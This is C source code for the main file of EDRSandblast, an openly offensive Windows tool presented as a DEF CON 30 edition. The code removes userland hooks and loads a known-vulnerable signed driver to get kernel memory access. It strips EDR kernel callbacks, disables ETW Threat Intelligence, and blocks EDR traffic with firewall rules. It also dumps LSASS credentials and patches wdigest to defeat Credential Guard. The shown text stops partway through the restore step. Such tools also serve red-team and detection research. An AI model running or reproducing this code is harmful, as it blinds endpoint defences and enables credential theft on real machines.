#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <Tchar.h>
#include <psapi.h>
#include <PathCch.h>
#include <shlwapi.h>
#include <time.h>

#ifdef _DEBUG
#include <assert.h>
#endif

#include "CredGuard.h"
#include "DriverOps.h"
#include "FileUtils.h"
#include "Firewalling.h"
#include "ETWThreatIntel.h"
#include "KernelCallbacks.h"
#include "KernelMemoryPrimitives.h"
#include "ProcessDump.h"
#include "ProcessDumpDirectSyscalls.h"
#include "NtoskrnlOffsets.h"
#include "ObjectCallbacks.h"
#include "PEBBrowse.h"
#include "RunAsPPL.h"
#include "Syscalls.h"
#include "Undoc.h"
#include "UserlandHooks.h"
#include "WdigestOffsets.h"

#include "../EDRSandblast/EDRSandblast.h"

typedef NTSTATUS(NTAPI* NtQueryInformationProcess_f)(
    HANDLE          ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );

void PrintBanner() {
    const TCHAR edrsandblast[] = TEXT("  ______ _____  _____   _____                 _ _     _           _   \r\n |  ____|  __ \\|  __ \\ / ____|               | | |   | |         | |  \r\n | |__  | |  | | |__) | (___   __ _ _ __   __| | |__ | | __ _ ___| |_ \r\n |  __| | |  | |  _  / \\___ \\ / _` | \'_ \\ / _` | \'_ \\| |/ _` / __| __|\r\n | |____| |__| | | \\ \\ ____) | (_| | | | | (_| | |_) | | (_| \\__ | |_ \r\n |______|_____/|_|  \\_|_____/ \\__,_|_| |_|\\__,_|_.__/|_|\\__,_|___/\\__|\n");   
    const TCHAR defcon[] = TEXT("D3FC0N 30 Edition");
    const TCHAR authors[2][256] = { TEXT("Thomas DIOT (@_Qazeer)"), TEXT("Maxime MEIGNAN (@th3m4ks)") };
    
    srand(time(NULL));
    int r = rand() % 2;

    _putts_or_not(edrsandblast);
    _tprintf_or_not(TEXT("  %s | %s & %s\n\n"), defcon, authors[r], authors[(r + 1) % 2]);
}

BOOL WasRestarted() {
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG written = 0;
    PE* n = PE_create(getModuleEntryFromNameW(L"ntdll.dll")->DllBase, TRUE);
    NtQueryInformationProcess_f NtQueryInformationProcess = (NtQueryInformationProcess_f)PE_functionAddr(n, "NtQueryInformationProcess"); //TODO : use a less-dirty method
    NtQueryInformationProcess(GetCurrentProcess(), ProcessBasicInformation, &pbi, sizeof(pbi), &written);
    DWORD parentPid = (DWORD)pbi.InheritedFromUniqueProcessId;
    HANDLE hParent = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, parentPid);
    CHAR parentImage[MAX_PATH] = { 0 };
    CHAR myImage[MAX_PATH] = { 0 };
    GetProcessImageFileNameA(hParent, parentImage, sizeof(parentImage));
    GetProcessImageFileNameA(GetCurrentProcess(), myImage, sizeof(myImage));
    PE_destroy(n);
    return strcmp(parentImage, myImage) == 0;
}

/*

--- Execution entry point.

*/

int _tmain(int argc, TCHAR** argv) {
    // Parse command line arguments and initialize variables to default values if needed.
    const TCHAR usage[] = TEXT("Usage: EDRSandblast.exe [-h | --help] [-v | --verbose] <audit | dump | cmd | credguard | firewall> [--usermode [--unhook-method <N>] [--direct-syscalls]] [--kernelmode] [--dont-unload-driver] [--no-restore] [--driver <RTCore64.sys>] [--service <SERVICE_NAME>] [--nt-offsets <NtoskrnlOffsets.csv>] [--wdigest-offsets <WdigestOffsets.csv>] [--add-dll <dll name or path>]* [-o | --dump-output <DUMP_FILE>]");
    const TCHAR extendedUsage[] = TEXT("\n\
-h | --help             Show this help message and exit.\n\
-v | --verbose          Enable a more verbose output.\n\
\n\
Actions mode:\n\
\n\
\taudit           Display the user-land hooks and / or Kernel callbacks without taking actions.\n\
\tdump            Dump the process specified by --process-name (LSASS process by default), as '<process_name>' in the current directory or at the\n\
\t                specified file using -o | --output <DUMP_FILE>.\n\
\tcmd             Open a cmd.exe prompt.\n\
\tcredguard       Patch the LSASS process' memory to enable Wdigest cleartext passwords caching even if\n\
\t                Credential Guard is enabled on the host. No kernel-land actions required.\n\
\tfirewall        Add Windows firewall rules to block network access for the EDR processes / services.\n\
\n\
--usermode              Perform user-land operations (DLL unhooking).\n\
--kernelmode            Perform kernel-land operations (Kernel callbacks removal and ETW TI disabling).\n\
\n\
--unhook-method <N>\n   Choose the userland un-hooking technique, from the following: \n\
\n\
\t0               Do not perform any unhooking (used for direct syscalls operations).\n\
\t1 (Default)     Uses the (probably monitored) NtProtectVirtualMemory function in ntdll to remove all\n\
\t                present userland hooks.\n\
\t2               Constructs a 'unhooked' (i.e. unmonitored) version of NtProtectVirtualMemory, by\n\
\t                allocating an executable trampoline jumping over the hook, and remove all present\n\
\t                userland hooks.\n\
\t3               Searches for an existing trampoline allocated by the EDR itself, to get an 'unhooked'\n\
\t                (i.e. unmonitored) version of NtProtectVirtualMemory, and remove all present userland\n\
\t                hooks.\n\
\t4               Loads an additional version of ntdll library into memory, and use the (hopefully\n\
\t                unmonitored) version of NtProtectVirtualMemory present in this library to remove all\n\
\t                present userland hooks.\n\
\t5               Allocates a shellcode that uses a direct syscall to call NtProtectVirtualMemory,\n\
\t                and uses it to remove all detected hooks\n\
--direct-syscalls       Use direct syscalls to conduct the specified action if possible (for now only for process dump).\n\
\n\
Other options:\n\
\n\
--dont-unload-driver                    Keep the vulnerable driver installed on the host\n\
                                        Default to automatically unsinstall the driver.\n\
--no-restore                            Do not restore the EDR drivers' Kernel Callbacks that were removed.\n\
                                        Default to restore the callbacks.\n\
\n\
--driver <RTCore64.sys>                 Path to the Micro-Star MSI Afterburner vulnerable driver file.\n\
                                        Default to 'RTCore64.sys' in the current directory.\n\
--service <SERVICE_NAME>                Name of the vulnerable service to intall / start.\n\
\n\
--nt-offsets <NtoskrnlOffsets.csv>      Path to the CSV file containing the required ntoskrnl.exe's offsets.\n\
                                        Default to 'NtoskrnlOffsets.csv' in the current directory.\n\
--wdigest-offsets <WdigestOffsets.csv>  Path to the CSV file containing the required wdigest.dll's offsets\n\
                                        (only for the 'credguard' mode).\n\
                                        Default to 'WdigestOffsets.csv' in the current directory.\n\
\n\
--add-dll <dll name or path>            Loads arbitrary libraries into the process' address space, before starting\n\
                                        anything. This can be useful to audit userland hooking for DLL that are not\n\
                                        loaded by default by this program. Use this option multiple times to load\n\
                                        multiple DLLs all at once.\n\
                                        Example of interesting DLLs to look at: user32.dll, ole32.dll, crypt32.dll,\n\
                                        samcli.dll, winhttp.dll, urlmon.dll, secur32.dll, shell32.dll...\n\
\n\
-o | --output <DUMP_FILE>               Output path to the dump file that will be generated by the 'dump' mode.\n\
                                        Default to 'process_name' in the current directory.\n\
\
-i | --internet                         Enables automatic symbols download from Microsoft Symbol Server\n\
                                        If a corresponding *Offsets.csv file exists, appends the downloaded offsets to the file for later use\n\
                                        OpSec warning: downloads and drops on disk a PDB file for ntoskrnl.exe and/or wdigest.dll\n");

    BOOL status;
    HRESULT hrStatus = S_OK;
    TCHAR currentFolderPath[MAX_PATH] = { 0 };
    GetCurrentDirectory(_countof(currentFolderPath), currentFolderPath);

    if (argc < 2) {
        _tprintf_or_not(TEXT("%s"), usage);
        return EXIT_FAILURE;
    }

    START_MODE startMode = none;
    TCHAR driverPath[MAX_PATH] = { 0 };
    TCHAR driverDefaultName[] = DEFAULT_DRIVER_FILE;
    TCHAR ntoskrnlOffsetCSVPath[MAX_PATH] = { 0 };
    TCHAR wdigestOffsetCSVPath[MAX_PATH] = { 0 };
    TCHAR processName[] = TEXT("lsass.exe");
    TCHAR outputPath[MAX_PATH] = { 0 };
    BOOL verbose = FALSE;
    BOOL removeVulnDriver = TRUE;
    BOOL restoreCallbacks = TRUE;
    BOOL userMode = FALSE;
    BOOL internet = FALSE;
    enum UNHOOK_METHOD_e unhook_method = UNHOOK_WITH_NTPROTECTVIRTUALMEMORY;
    BOOL directSyscalls = FALSE;
    BOOL kernelMode = FALSE;
    int lpExitCode = EXIT_SUCCESS;
    struct FOUND_EDR_CALLBACKS* foundEDRDrivers = NULL;
    BOOL ETWTIState = FALSE;
    BOOL foundNotifyRoutineCallbacks = FALSE;
    BOOL foundObjectCallbacks = FALSE;
    HOOK* hooks = NULL;
    //TODO implement a "force" mode : remove notify routines & object callbacks without checking if it belongs to an EDR (useful as a last resort if a driver is not recognized)


    for (int i = 1; i < argc; i++) {
        if (_tcsicmp(argv[i], TEXT("dump")) == 0) {
            startMode = dump;
        }
        else if (_tcsicmp(argv[i], TEXT("cmd")) == 0) {
            startMode = cmd;
        }
        else if (_tcsicmp(argv[i], TEXT("credguard")) == 0) {
            startMode = credguard;
        }
        else if (_tcsicmp(argv[i], TEXT("audit")) == 0) {
            startMode = audit;
        }
        else if (_tcsicmp(argv[i], TEXT("firewall")) == 0) {
            startMode = firewall;
        }
        else if (_tcsicmp(argv[i], TEXT("-h")) == 0 || _tcsicmp(argv[i], TEXT("--help")) == 0) {
            _putts_or_not(usage);
            _putts_or_not(extendedUsage);
            return EXIT_SUCCESS;
        }
        else if (_tcsicmp(argv[i], TEXT("-v")) == 0 || _tcsicmp(argv[i], TEXT("--verbose")) == 0) {
            verbose = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--usermode")) == 0) {
            userMode = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--kernelmode")) == 0) {
            kernelMode = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--dont-unload-driver")) == 0) {
            removeVulnDriver = FALSE;
        }
        else if (_tcsicmp(argv[i], TEXT("--no-restore")) == 0) {
            restoreCallbacks = FALSE;
        }
        else if (_tcsicmp(argv[i], TEXT("--driver")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(driverPath, _countof(driverPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--service")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            SetDriverServiceName(argv[i]);
        }
        else if (_tcsicmp(argv[i], TEXT("--nt-offsets")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--wdigest-offsets")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("-o")) == 0 || _tcsicmp(argv[i], TEXT("--dump-output")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(outputPath, _countof(outputPath), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--process-name")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            _tcsncpy_s(processName, _countof(processName), argv[i], _tcslen(argv[i]));
        }
        else if (_tcsicmp(argv[i], TEXT("--unhook-method")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            unhook_method = _ttoi(argv[i]);
        }
        else if (_tcsicmp(argv[i], TEXT("--direct-syscalls")) == 0) {
            directSyscalls = TRUE;
        }
        else if (_tcsicmp(argv[i], TEXT("--add-dll")) == 0) {
            i++;
            if (i > argc) {
                _tprintf_or_not(TEXT("%s"), usage);
                return EXIT_FAILURE;
            }
            HANDLE hAdditionnalLib = LoadLibrary(argv[i]);
            if (hAdditionnalLib == INVALID_HANDLE_VALUE) {
                _tprintf_or_not(TEXT("Library %s could not have been loaded, exiting...\n"), argv[i]);
                return EXIT_FAILURE;
            }
        }
        else if (_tcsicmp(argv[i], TEXT("-i")) == 0 || _tcsicmp(argv[i], TEXT("--internet")) == 0) {
            internet = TRUE;
        }
        else {
            _tprintf_or_not(TEXT("%s"), usage);
            return EXIT_FAILURE;
        }
    }

    if (WasRestarted()) {
        removeVulnDriver = FALSE;
    }
    else {
        PrintBanner();
    }

    // Command line option consistency checks.
    if (startMode == none){
        _putts_or_not(TEXT("[!] You did not provide an action to perform: audit, dump, credguard or cmd"));
        return EXIT_FAILURE;
    }
    if (startMode == cmd && !kernelMode) {
        _putts_or_not(TEXT("'cmd' mode needs kernel-land unhooking to work, please enable --kernelmode"));
        return EXIT_FAILURE;
    }
    if (!userMode && !kernelMode) {
        _putts_or_not(TEXT("[!] You did not provide at least one option between --usermode and --kernelmode. Enabling --usermode by default...\n"));
        userMode = TRUE;
    }
    if (!userMode && kernelMode) {
        _putts_or_not(TEXT("[!] If kernel mode bypass is enabled, it is recommended to enable usermode bypass as well (e.g. to unhook the NtLoadDriver API call)\n"));
    }
    if (startMode == credguard && !kernelMode) {
        _putts_or_not(TEXT("[!] Credential Guard bypass might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
    }
    if (startMode == dump && !kernelMode) {
        _putts_or_not(TEXT("[!] LSASS dump might fail if RunAsPPL is enabled. Enable --kernelmode to bypass PPL\n"));
    }

    // TODO: set isSafeToExecutePayloadUserland by unhook to TRUE / FALSE if there are still hooks.
    BOOL isSafeToExecutePayloadUserland = TRUE;
    BOOL isSafeToExecutePayloadKernelland = TRUE;

    if (userMode) {
        _putts_or_not(TEXT("[===== USER MODE =====]\n"));
        _putts_or_not(TEXT("[+] Detecting userland hooks in all loaded DLLs..."));
        hooks = searchHooks(NULL);
        _putts_or_not(TEXT(""));

        if (startMode != audit && unhook_method != UNHOOK_NONE) {
            if (hooks->disk_function != NULL) {
                _putts_or_not(TEXT("[+] [Hooks]\tRemoving detected userland hooks..."));
            }
            for (HOOK* ptr = hooks; ptr->disk_function != NULL; ptr++) {
                printf_or_not("[+] [Hooks]\tUnhooking %s using method %ld...\n", ptr->functionName, unhook_method);
                // TODO: return if all hook could be removed and set isSafeToExecutePayloadUserland.
                unhook(ptr, unhook_method);
            }
        }
        _putts_or_not(TEXT(""));
    }

    if (kernelMode) {
        _putts_or_not(TEXT("[===== KERNEL MODE =====]\n"));

        if (_tcslen(driverPath) == 0) {
            PathCchAppend(driverPath, _countof(driverPath), currentFolderPath);
            PathCchAppend(driverPath, _countof(driverPath), driverDefaultName);
        }
        if (!FileExists(driverPath)) {
            _tprintf_or_not(TEXT("[!] Required driver file not present at %s\nExiting...\n"), driverPath);
            return EXIT_FAILURE;
        }

        if (_tcslen(ntoskrnlOffsetCSVPath) == 0) {
            TCHAR offsetCSVName[] = TEXT("NtoskrnlOffsets.csv");
            PathCchAppend(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), currentFolderPath);
            PathCchAppend(ntoskrnlOffsetCSVPath, _countof(ntoskrnlOffsetCSVPath), offsetCSVName);
        }

        _putts_or_not(TEXT("[+] Setting up prerequisites for the kernel read/write primitives..."));
        // Initialize the global variable containing ntoskrnl.exe Notify Routines', _PS_PROTECTION and ETW TI functions offsets.
        if (FileExists(ntoskrnlOffsetCSVPath)) {
            _putts_or_not(TEXT("[+] Loading kernel related offsets from the CSV file"));
            LoadNtoskrnlOffsetsFromFile(ntoskrnlOffsetCSVPath);
            if (!NtoskrnlAllKernelCallbacksOffsetsArePresent()) { // (only check notify routines offsets, because ETW Ti might legitimately be absent on "old" Windows versions)
                _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of ntoskrnl in use."));
            }
        }
        if (internet && !NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
            _putts_or_not(TEXT("[+] Downloading kernel related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
#if _DEBUG
            LoadNtoskrnlOffsetsFromInternet(FALSE);
#else
            LoadNtoskrnlOffsetsFromInternet(TRUE);
#endif
            if (!NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
                _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));
            }
            else {
                _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
                if (FileExists(ntoskrnlOffsetCSVPath)) {
                    _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
                    SaveNtoskrnlOffsetsToFile(ntoskrnlOffsetCSVPath);
                }
            }
        }
        if (!NtoskrnlAllKernelCallbacksOffsetsArePresent()) {
            _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file. Aborting...\n"));
            return EXIT_FAILURE;
        }

        // Print the kernel offsets in verbose mode.
        if (verbose) {
            PrintNtoskrnlOffsets();
        }

        // Install the vulnerable driver to have read / write in Kernel memory.
        LPTSTR serviceNameIfAny = NULL;
        BOOL isDriverAlreadyRunning = IsDriverServiceRunning(driverPath, &serviceNameIfAny);
        if (isDriverAlreadyRunning){
            _putts_or_not(TEXT("[+] Vulnerable driver is already running!\n"));
            SetDriverServiceName(serviceNameIfAny);
        }
        else {
            _putts_or_not(TEXT("[+] Installing vulnerable driver..."));
            status = InstallVulnerableDriver(driverPath);
            if (status != TRUE) {
                _putts_or_not(TEXT("[!] An error occurred while installing the vulnerable driver"));
                _putts_or_not(TEXT("[*] Uninstalling the service and attempting the install again..."));
                Sleep(20000);
                CloseDriverHandle();
                status = UninstallVulnerableDriver();
                Sleep(2000);
                status = status && InstallVulnerableDriver(driverPath);
                Sleep(2000);
                if (status != TRUE) {
                    _putts_or_not(TEXT("[!] New uninstall / install attempt failed, make sure that there is no trace of the driver left..."));
                    return EXIT_FAILURE;
                }
            }
            Sleep(5000);// TODO : replace by a reliable method to check if the driver is ready
            _putts_or_not(TEXT("\n"));
        }

        // Checks if any EDR callbacks are configured. If no EDR callbacks are found, then dump LSASS / exec cmd / patch CredGuard. Ohterwise, remove the EDR callbacks and start a new (unmonitored) process executing itself to dump LSASS.
        _putts_or_not(TEXT("[+] Checking if any EDR kernel notify rountines are set for image loading, process and thread creations..."));
        foundEDRDrivers = (struct FOUND_EDR_CALLBACKS*)calloc(1, sizeof(struct FOUND_EDR_CALLBACKS));
        if (!foundEDRDrivers) {
            _putts_or_not(TEXT("[!] Couldn't allocate memory to enumerate the drivers in Kernel callbacks"));
            return EXIT_FAILURE;
        }
        foundNotifyRoutineCallbacks = EnumEDRNotifyRoutineCallbacks(foundEDRDrivers, verbose);
        if (foundNotifyRoutineCallbacks) {
            isSafeToExecutePayloadKernelland = FALSE;
        }
        _putts_or_not(TEXT(""));
        
        _putts_or_not(TEXT("[+] Checking if EDR callbacks are registered on processes and threads handle creation/duplication..."));
        foundObjectCallbacks = EnumEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
        _tprintf_or_not(TEXT("[+] [ObjectCallblacks]\tObject callbacks are %s !\n"), foundObjectCallbacks ? TEXT("present") : TEXT("not found"));
        if (foundObjectCallbacks) {
            isSafeToExecutePayloadKernelland = FALSE;
        }
        _putts_or_not(TEXT(""));

        _putts_or_not(TEXT("[+] [ETWTI]\tChecking the ETW Threat Intelligence Provider state..."));
        ETWTIState = isETWThreatIntelProviderEnabled(verbose);
        _tprintf_or_not(TEXT("[+] [ETWTI]\tETW Threat Intelligence Provider is %s!\n"), ETWTIState ? TEXT("ENABLED") : TEXT("DISABLED"));
        _putts_or_not(TEXT(""));
        if (ETWTIState) {
            isSafeToExecutePayloadKernelland = FALSE;
        }
    }

    if (startMode != audit) {

        if (isSafeToExecutePayloadKernelland && (isSafeToExecutePayloadUserland || directSyscalls)) {
            _putts_or_not(TEXT("[+] Process is \"safe\" to launch our payload\n"));

            // Do the operation the tool was started for.
            switch (startMode) {

            // Start a process executing cmd.exe.
            case cmd:
                _putts_or_not(TEXT("[+] Kernel callbacks have normally been removed, starting cmd.exe\n")
                    TEXT("WARNING: EDR kernel callbacks will be restored after exiting the cmd prompt (by typing exit)\n")
                    TEXT("WARNING: While unlikely, the longer the callbacks are removed, the higher the chance of being detected / causing a BSoD upon restore is!\n"));
                // Find cmd.exe path.
                TCHAR systemDirectory[MAX_PATH] = { 0 };
                GetSystemDirectory(systemDirectory, _countof(systemDirectory));
                TCHAR cmdPath[MAX_PATH] = { 0 };
                _tcscat_s(cmdPath, _countof(cmdPath), systemDirectory);
                _tcscat_s(cmdPath, _countof(cmdPath), TEXT("\\cmd.exe"));
                _tsystem(cmdPath);
                break;

            // Dump the LSASS process in a new thread.
            case dump:
                if (kernelMode) {
                    if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
                        _putts_or_not(TEXT("\n[+] RunPPL bypass: Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) since PPL is supported by the OS. This will allow access to LSASS if RunAsPPL is enabled"));
                        SetCurrentProcessAsProtected(verbose);
                    }
                }

                _putts_or_not(TEXT("[+] Attempting to dump the process"));

                // Determine dump path based on specified process name.
                if (_tcslen(outputPath) == 0) {
                    TCHAR* processNameFilename = _tcsdup(processName);
                    hrStatus = PathCchRemoveExtension(processNameFilename, _tcslen(processNameFilename) + 1);
                    if (FAILED(hrStatus)) {
                        free(processNameFilename);
                        processNameFilename = _tcsdup(TEXT("dmp.txt"));
                    }
                    _tcscat_s(outputPath, _countof(outputPath), currentFolderPath);
                    _tcscat_s(outputPath, _countof(outputPath), TEXT("\\"));
                    _tcscat_s(outputPath, _countof(outputPath), processNameFilename);
                    if (processNameFilename) {
                        free(processNameFilename);
                        processNameFilename = NULL;
                    }
                }
                else if (PathIsRelative(outputPath)) {
                    SIZE_T newOutputPathsZ = _tcslen(currentFolderPath) + _tcslen(TEXT("\\")) + _tcslen(outputPath) + 1;
                    TCHAR* newOutputPath = calloc(newOutputPathsZ, sizeof(TCHAR));
                    if (!newOutputPath) {
                        _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
                        lpExitCode = EXIT_FAILURE;
                        break;
                    }
                    _tcscat_s(newOutputPath, newOutputPathsZ, currentFolderPath);
                    _tcscat_s(newOutputPath, newOutputPathsZ, TEXT("\\"));
                    _tcscat_s(newOutputPath, newOutputPathsZ, outputPath);
                    _tcscpy_s(outputPath, _countof(outputPath), newOutputPath);
                    if (newOutputPath) {
                        free(newOutputPath);
                        newOutputPath = NULL;
                    }
                }

                HANDLE hThread = NULL;

                // Set arguments for function call through 
                PVOID* pThreatArguments = calloc(2, sizeof(PVOID));
                if (!pThreatArguments) {
                    _putts_or_not(TEXT("[!] A fatal error occurred while allocating memory for thread arguments"));
                    lpExitCode = EXIT_FAILURE;
                    break;
                }
                pThreatArguments[0] = processName;
                pThreatArguments[1] = outputPath;

                if (directSyscalls) {
                    hThread = CreateThread(NULL, 0, SandMiniDumpWriteDumpFromThread, (PVOID) pThreatArguments, 0, NULL);
                }
                else {
                    hThread = CreateThread(NULL, 0, dumpProcessFromThread, (PVOID) pThreatArguments, 0, NULL);
                }
                if (hThread) {
                    WaitForSingleObject(hThread, INFINITE);
                    GetExitCodeThread(hThread, (PDWORD)&lpExitCode);
                    if (lpExitCode != 0) {
                        _putts_or_not(TEXT("[!] A fatal error occurred during the LSASS dump / execution of cmd.exe"));
                        lpExitCode = EXIT_FAILURE;
                    }
                }
                else {
                    _putts_or_not(TEXT("[!] An error occurred while attempting to start the new thread..."));
                    lpExitCode = EXIT_FAILURE;
                }
                if (pThreatArguments) {
                    free(pThreatArguments);
                    pThreatArguments = NULL;
                }
                break;

            // Bypass Cred Guard (for new logins) by patching LSASS's wdigest module in memory.
            case credguard:
                if (_tcslen(wdigestOffsetCSVPath) == 0) {
                    TCHAR offsetCSVName[] = TEXT("\\WdigestOffsets.csv");
                    _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), currentFolderPath, _countof(currentFolderPath));
                    _tcsncat_s(wdigestOffsetCSVPath, _countof(wdigestOffsetCSVPath), offsetCSVName, _countof(offsetCSVName));
                }

                if (FileExists(wdigestOffsetCSVPath)) {
                    _putts_or_not(TEXT("[+] Loading wdigest related offsets from the CSV file"));
                    LoadWdigestOffsetsFromFile(wdigestOffsetCSVPath);
                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                        _putts_or_not(TEXT("[!] Offsets are missing from the CSV for the version of wdigest in use."));
                    }
                }
                if (internet && (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0)) {
                    _putts_or_not(TEXT("[+] Downloading wdigest related offsets from the MS Symbol Server (will drop a .pdb file in current directory)"));
#if _DEBUG
                    LoadWdigestOffsetsFromInternet(FALSE);
#else
                    LoadWdigestOffsetsFromInternet(TRUE);
#endif
                    if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                        _putts_or_not(TEXT("[-] Downloading offsets from the internet failed !"));

                    }
                    else {
                        _putts_or_not(TEXT("[+] Downloading offsets succeeded !"));
                        if (FileExists(wdigestOffsetCSVPath)) {
                            _putts_or_not(TEXT("[+] Saving them to the CSV file..."));
                            SaveWdigestOffsetsToFile(wdigestOffsetCSVPath);
                        }
                    }
                }
                if (g_wdigestOffsets.st.g_fParameter_UseLogonCredential == 0x0 || g_wdigestOffsets.st.g_IsCredGuardEnabled == 0x0) {
                    _putts_or_not(TEXT("[!] The offsets must be computed using the provided script and added to the offsets CSV file. LSASS won't be patched...\n"));
                    lpExitCode = EXIT_FAILURE;
                }
                else {
                    _putts_or_not(TEXT(""));
                    if (kernelMode) {
                        _putts_or_not(TEXT("[+] Self protect our current process as Light WinTcb(PsProtectedSignerWinTcb - Light) if PPL are supported by the OS(Offset of _PS_PROTECTION exists). This will allow lsass access is RunAsPPL is enabled"));
                        if (g_ntoskrnlOffsets.st.eprocess_protection != 0x0) {
                            SetCurrentProcessAsProtected(verbose);
                        }
                    }
                    if (disableCredGuardByPatchingLSASS()) {
                        _putts_or_not(TEXT("[+] LSASS was patched and Credential Guard should be bypassed for future logins on the system."));
                    }
                    else {
                        _putts_or_not(TEXT("[!] LSASS couldn't be patched and Credential Guard will not be bypassed."));
                        lpExitCode = EXIT_FAILURE;
                    }
                }
                break;

            // Add firewall rules to block EDR network communications.
            case firewall:
            {
                hrStatus = S_OK;
                fwBlockingRulesList sFWEntries = { 0 };

                _tprintf_or_not(TEXT("[*] Configuring Windows Firewall rules to block EDR network access...\n"));
                hrStatus = FirewallBlockEDR(&sFWEntries);
                if (FAILED(hrStatus)) {
                    _tprintf_or_not(TEXT("[!] An error occured while attempting to create Firewall rules!\n"));
                }
                else {
                    _tprintf_or_not(TEXT("[+] Successfully configured Windows Firewall rules to block EDR network access!\n"));

                }
                _tprintf_or_not(TEXT("\n"));
                FirewallPrintManualDeletion(&sFWEntries);
                break;
            }
            }
            _putts_or_not(TEXT(""));
        }

        // If the the payload is not safe to execute.
        else {
            if (WasRestarted()) {
                _tprintf_or_not(TEXT("Something failed, cannot perform safely execute payload. Aborting...\n"));
                exit(1);
            }
            _putts_or_not(TEXT("[+] Process is NOT \"safe\" to launch our payload, removing monitoring and starting another process...\n"));
#ifdef _DEBUG
            assert(kernelMode);
#endif
            /*
            * 1/3 : Removing kernel-based monitoring.
            */
            // Disable (temporarily) ETW Threat Intel functions by patching the ETW Threat Intel provider ProviderEnableInfo.
            if (ETWTIState) {
                DisableETWThreatIntelProvider(verbose);
                _putts_or_not(TEXT(""));
            }
            // If kernel callbacks are monitoring processes, we remove them and start a new process.
            if (foundNotifyRoutineCallbacks) {
                _putts_or_not(TEXT("[+] Removing kernel callbacks registered by EDR for process creation, thread creation and image loading..."));
                RemoveEDRNotifyRoutineCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }
            if (foundObjectCallbacks) {
                _putts_or_not(TEXT("[+] Disabling kernel callbacks registered by EDR for process and thread opening or handle duplication..."));
                DisableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }

            /*
            * 2/3 : Starting "resursively" our process.
            */
            // Re-executing the present binary, without any kernel callback nor ETWTI enabled.
            _putts_or_not(TEXT("[+] All EDR drivers were successfully removed from Kernel callbacks!\n\n==================================================\nStarting a new unmonitored process...\n==================================================\n"));
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            memset(&si, 0, sizeof(si));
            si.cb = sizeof(si);
            memset(&pi, 0, sizeof(pi));
            // Pass the same argument as the parent process.
            TCHAR* currentCommandLine = GetCommandLine();
            CloseDriverHandle();
            if (CreateProcess(argv[0], currentCommandLine, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else {
                _putts_or_not(TEXT("[!] An error occured while trying to create a new process"));
                lpExitCode = EXIT_FAILURE;
            }
            _putts_or_not(TEXT("\n"));

            /*
            * 3/3 : Restoring state after execution.
            */
            // By default, restore the removed EDR kernel callbacks. restoreCallbacks set to FALSE if the no restore CLI flag is set.
            if (restoreCallbacks == TRUE && foundNotifyRoutineCallbacks) {
                _putts_or_not(TEXT("[+] Restoring EDR's kernel notify routine callbacks..."));
                RestoreEDRNotifyRoutineCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }
            if (restoreCallbacks == TRUE && foundObjectCallbacks) {
                _putts_or_not(TEXT("[+] Restoring EDR's kernel object callbacks..."));
                EnableEDRProcessAndThreadObjectsCallbacks(foundEDRDrivers);
                _putts_or_not(TEXT(""));
            }

            // Renable the ETW Threat Intel provider.
